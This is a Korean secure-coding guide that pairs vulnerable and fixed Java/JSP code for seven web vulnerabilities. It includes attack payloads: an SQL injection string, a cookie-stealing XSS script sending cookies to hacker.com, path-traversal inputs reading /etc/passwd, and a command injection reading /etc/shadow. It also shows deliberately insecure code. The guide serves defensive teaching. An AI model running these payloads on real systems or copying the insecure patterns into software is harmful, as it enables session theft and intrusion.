CASE 01. SQL 삽입 (SQL Injection, 구조화 질의 언어 삽입)

**SQL 삽입(SQL Injection, 구조화 질의 언어 삽입)**은 신뢰할 수 없는 외부 입력값이 데이터베이스(Database, 데이터 저장소) 쿼리 구조를 강제로 변경하는 취약점입니다. 개발자가 문자열 결합 방식(String Concatenation)으로 쿼리를 생성할 때, 공격자의 입력값이 코드(Code)로 해석되어 로직을 변조합니다.

이 취약점의 근본 원인은 **데이터(Data)와 제어문(Command)의 혼재**에 있습니다. 사용자가 입력한 값은 단순한 데이터여야 하지만, 쿼리문 안으로 들어가면서 데이터베이스 엔진에 의해 명령어로 오인되는 현상입니다. 특히 사용자 인증 우회, 데이터 유출, 데이터 삭제 등의 치명적인 결과를 초래합니다.

[도식 1: SQL Injection 공격 시나리오]

SOURCE (외부 입력)
' OR 1=1 --
DYNAMIC QUERY BUILDING
SELECT * FROM users WHERE ID='' OR 1=1 --'
SINK (DB 실행 지점)
전체 데이터 유출
Vulnerable Implementation (취약한 로그인 로직) 
// Java 서블릿 또는 컨트롤러 환경에서의 예제
public User login(String userId, String userPw) {
    // 1. 외부 입력값이 직접 쿼리 문자열에 결합됨 (취약점 발생 지점)
    String query = "SELECT * FROM users WHERE id = '" + userId + "' AND pw = '" + userPw + "'";
    
    try (Statement stmt = connection.createStatement()) {
        // 2. 오염된 쿼리 문자열이 Sink(실행 함수)인 executeQuery로 전달
        // 만약 userId에 "' OR 1=1 --"가 입력되면 WHERE 조건이 항상 참이 됨
        ResultSet rs = stmt.executeQuery(query); 
        
        if (rs.next()) {
            return new User(rs.getString("id"), rs.getString("name"));
        }
    } catch (SQLException e) {
        log.error("DB Error: " + e.getMessage()); // 오류 메시지를 통한 정보 유출 위험도 존재
    }
    return null;
}
Secure Remediation (매개변수화된 질의문 사용) 
// PreparedStatement를 통한 방어 기법 적용
public User secureLogin(String userId, String userPw) {
    // 1. 쿼리 구조를 미리 정의하고 데이터가 들어갈 자리를 '?'로 확보 (구조-데이터 분리)
    String sql = "SELECT * FROM users WHERE id = ? AND pw = ?";
    
    // 2. connection으로부터 PreparedStatement 생성
    try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
        // 3. 각 파라미터에 값을 바인딩(Binding). 이 과정에서 입력값은 단순 '리터럴'로 처리됨
        // 공격자가 특수문자를 넣어도 DB 엔진은 이를 코드가 아닌 데이터로 인식
        pstmt.setString(1, userId);
        pstmt.setString(2, userPw);
        
        try (ResultSet rs = pstmt.executeQuery()) {
            if (rs.next()) {
                return new User(rs.getString("id"), rs.getString("name"));
            }
        }
    } catch (SQLException e) {
        log.error("An internal error occurred."); // 상세한 에러 정보는 사용자에게 노출 금지
    }
    return null;
}

CASE 02. 저장형 교차 사이트 스크립팅 (Stored XSS, 저장형 교차 사이트 스크립팅)

**저장형 크로스 사이트 스크립팅(Stored XSS, 교차 사이트 스크립팅)**은 악성 스크립트(JavaScript)가 서버의 데이터베이스에 저장된 후, 이를 열람하는 불특정 다수의 사용자 브라우저에서 스크립트가 실행되는 공격입니다.

이 공격의 무서움은 **지속성(Persistence)**에 있습니다. 한 번 게시판이나 프로필에 저장되면, 해당 페이지를 방문하는 모든 사용자의 세션 쿠키(Session Cookie)를 탈취하거나 피싱 사이트로 리다이렉트(Redirect, 경로 재지정) 시킬 수 있습니다.

[도식 2: Stored XSS 전파 경로]

ATTACKER
<script>fetch(...)</script>
SERVER DB
VICTIMS
SESSION EXPOSED
Source to Sink Trace (데이터 추적 분석)
Stage 01: Data Ingestion (Source) Untrusted 
// 사용자가 게시글을 작성하는 지점
String content = request.getParameter("content"); 
// content 값이 "<script>location.href='http://hacker.com?c='+document.cookie</script>" 일 경우
boardService.save(content); // 필터링 없이 그대로 DB 저장 (위험)
Stage 02: Unsafe Rendering (Sink) Vulnerable 
<!-- JSP 또는 템플릿 엔진에서 데이터를 출력하는 지점 -->
<div class="post-content">
    <%= board.getContent() %> <!-- 인코딩 없이 출력되면 브라우저가 스크립트로 해석 -->
</div>
Stage 03: Secure Output (Defense) Safe 
<!-- HTML Entity Encoding 적용 -->
<div class="post-content">
    <c:out value="${board.content}" /> <!-- JSTL 태그는 기본적으로 < 를 &lt; 로 인코딩함 -->
    <!-- 또는 라이브러리 활용 -->
    <%= HtmlUtils.htmlEscape(board.getContent()) %>
</div>

CASE 03. 비인가 객체 참조 (IDOR, 비인가 객체 참조)

**IDOR(Insecure Direct Object Reference, 비인가 객체 참조)**는 사용자가 접근 제어(Access Control) 권한 확인 없이 내부 객체(데이터베이스 키, 파일 등)를 직접 참조할 수 있을 때 발생하는 논리적 결함입니다.

이 취약점은 단순한 코딩 실수가 아닌 **설계(Logic)의 부재**입니다. 서버는 "사용자가 로그인을 했는가?"(인증, Authentication)만 확인하고, "이 사용자가 해당 번호의 글을 읽을 권한이 있는가?"(인가, Authorization)를 확인하지 않을 때 발생합니다.

[도식 3: 수평적 권한 상승 메커니즘]

User A (UID: 101)
MANIPULATED URL
/api/order/102
ACCESSING USER B's DATA
취약한 API 아키텍처 (인가 로직 누락)
@GetMapping("/order/{orderId}")
public Order getOrderDetails(@PathVariable Long orderId) {
    // 단순하게 URL에서 받은 orderId로 조회하여 반환
    // 시스템은 사용자가 로그인했는지만 체크할 뿐,
    // 이 주문이 현재 로그인한 사용자의 것인지 검증하지 않음
    return orderService.findById(orderId);
}
안전한 보안 아키텍처 (소유권 검증 포함)
@GetMapping("/order/{orderId}")
public Order getOrderDetails(@PathVariable Long orderId, Principal principal) {
    Order order = orderService.findById(orderId);
    
    // 핵심 방어: 현재 세션의 사용자명과 객체의 소유자명을 비교
    String currentUserName = principal.getName();
    if (order != null && !order.getOwner().equals(currentUserName)) {
        throw new AccessDeniedException("접근 권한이 없습니다.");
    }
    return order;
}

CASE 04. 경로 조작 (Path Traversal, 경로 조작)

**경로 조작(Path Traversal, 경로 조작)**은 사용자의 입력값이 서버 파일 시스템의 경로를 구성할 때, 이를 적절히 검증하지 않아 의도하지 않은 파일(시스템 설정, 비밀번호 파일 등)에 접근하는 취약점입니다.

공격자는 주로 상위 디렉터리 이동 문자열인 `../` (점-점-슬래시)를 사용하여 웹 루트(Web Root) 디렉터리를 탈출합니다. 이를 **디렉터리 탐색(Directory Traversal)** 공격이라고도 부릅니다.
Attack Vectors (공격 벡터)
  • ?file=../../../../etc/passwd
  • ?doc=..\..\windows\win.ini
  • ?img=%2e%2e%2f%2e%2e%2fconfig.php
Remediation Rules (방어 규칙)

"파일 시스템에 직접 접근하는 파라미터는 반드시 화이트리스트 검증을 거쳐야 합니다."

Canonicalization Basename Extraction Storage ID Mapping
Implementation (실제 구현 예시)
public void downloadFile(String filename) {
    // 1. 보안 위반: 입력값을 경로로 직접 사용
    // File file = new File("/data/uploads/" + filename);
    
    // 2. 안전한 구현: 파일 이름만 추출 (Basename)
    String safeName = new File(filename).getName(); 
    // "../../etc/passwd" -> "passwd" 로 변환됨
    
    File file = new File("/data/uploads/", safeName);
    
    // 3. 정규화(Canonicalization)를 통한 최종 경로 검증
    String canonicalPath = file.getCanonicalPath();
    if (!canonicalPath.startsWith("/data/uploads/")) {
        throw new SecurityException("Invalid path access!");
    }
}

CASE 05. 운영체제 명령어 삽입 (Command Injection, 운영체제 명령어 삽입)

**운영체제 명령어 삽입(Command Injection, 운영체제 명령어 삽입)**은 서버 측 애플리케이션이 외부 입력값을 사용하여 시스템 명령어를 실행할 때, 공격자가 쉘 메타문자(Shell Metacharacters)를 사용하여 추가 명령을 실행하는 취약점입니다.

세미콜론(`;`), 앰퍼샌드(`&`), 파이프(`|`)와 같은 문자들은 쉘(Shell) 환경에서 명령어를 구분하거나 연결하는 역할을 합니다. 공격자는 이를 이용해 `ping` 명령어를 수행하는 웹 폼에서 서버의 중요 파일을 삭제하거나 백도어(Backdoor, 뒷문)를 설치할 수 있습니다.

[도식 5: 메타문자를 이용한 명령 실행 변조]

ping 8.8.8.8
+
; cat /etc/shadow
EXPLOITED
Dangerous Implementation (취약한 쉘 실행) 
// 네트워크 상태 진단 도구 예제
public void checkHost(String ip) {
    // 쉘 메타문자가 포함될 경우 뒤의 명령어가 연달아 실행됨
    String command = "sh -c 'ping -c 3 " + ip + "'";
    
    // Runtime.exec()는 문자열 전체를 쉘로 전달하므로 매우 위험
    Process process = Runtime.getRuntime().exec(command);
    // ... 결과 처리 ...
}
Secure Alternative (API 방식의 인자 전달) 
public void secureCheckHost(String ip) {
    // 1. 입력값에 대한 엄격한 형식 검사 (Regex)
    if (!ip.matches("^[0-9.]+$")) throw new IllegalArgumentException("Invalid IP");

    // 2. ProcessBuilder를 사용하여 명령어와 인자를 배열로 분리
    // 이 방식은 쉘을 거치지 않고 직접 실행하므로 메타문자가 해석되지 않음
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", ip);
    Process p = pb.start();
}

CASE 06. 하드코딩된 자격 증명 (Hardcoded Credentials, 하드코딩된 자격 증명)

**하드코딩된 자격 증명(Hardcoded Credentials, 하드코딩된 자격 증명)**은 데이터베이스 비밀번호, API(Application Programming Interface) 키, 암호화 키 등을 소스코드 내부에 평문으로 직접 기입하는 보안 약점입니다.

소스코드가 깃허브(GitHub)와 같은 공용 저장소에 배포될 경우, 공격자는 봇(Bot)을 돌려 1초 만에 자격 증명을 탈취합니다. 이는 인프라 전체의 권한이 넘어가는 대형 사고로 이어집니다.
노출된 코드 패턴 (Leaked) 
// 1. DB 접속 정보 하드코딩
String dbUrl = "jdbc:mysql://prod-db:3306/main";
String dbUser = "admin";
String dbPass = "P@ssw0rd1234!"; // 절대 금지

// 2. 클라우드 서비스 API 키 노출
String awsKey = "AKIAJS5F7EXAMPLE";
현대적 자격 증명 관리 (Best) 
// 환경 변수 또는 전용 자격 증명 관리 서버 이용
String dbPass = System.getenv("DB_PASSWORD");

// AWS Secrets Manager 활용 예시
GetSecretValueRequest getSecretValueRequest = 
    new GetSecretValueRequest().withSecretId("prod/db");
// API 호출을 통해 런타임에 동적으로 로드

CASE 07. 안전하지 않은 역직렬화 (Insecure Deserialization, 안전하지 않은 역직렬화)

**안전하지 않은 역직렬화(Insecure Deserialization, 안전하지 않은 역직렬화)**는 신뢰할 수 없는 데이터로부터 객체를 복원(Deserialization)할 때, 공격자가 변조한 객체가 실행 흐름을 장악하여 악의적인 행위를 수행하게 하는 취약점입니다.

직렬화(Serialization)는 객체 상태를 바이트 스트림(Byte Stream)으로 바꾸는 과정이며, 역직렬화는 그 반대입니다. 공격자는 이 과정에서 실행되는 `readObject()`와 같은 메서드 내부에서 연쇄적으로 호출되는 함수들(Gadget Chain)을 엮어 **원격 코드 실행(RCE, Remote Code Execution)**을 달성합니다.
Critical Code Insight (역직렬화의 위험성) 
// 취약한 역직렬화 코드 패턴
public Object loadUser(byte[] data) {
    try (ObjectInputStream ois = 
         new ObjectInputStream(new ByteArrayInputStream(data))) {
        // data 내부에 공격용 객체가 포함되어 있다면 
        // readObject() 시점에 즉시 공격 스크립트 실행됨
        return ois.readObject(); 
    }
}
보안 대책 가이드라인
  • **데이터 형식의 전환**: 이진(Binary) 객체 직렬화 대신 JSON, XML과 같은 텍스트 기반 형식을 사용하고 스키마를 검증하십시오.
  • **직렬화 필터링**: Java 9+ 의 `ObjectInputFilter`를 사용하여 허용된 클래스만 역직렬화되도록 화이트리스트를 구성하십시오.
  • **최소 권한 원칙**: 역직렬화 프로세스가 실행되는 환경에 최소한의 시스템 권한만 부여하여 피해를 최소화하십시오.
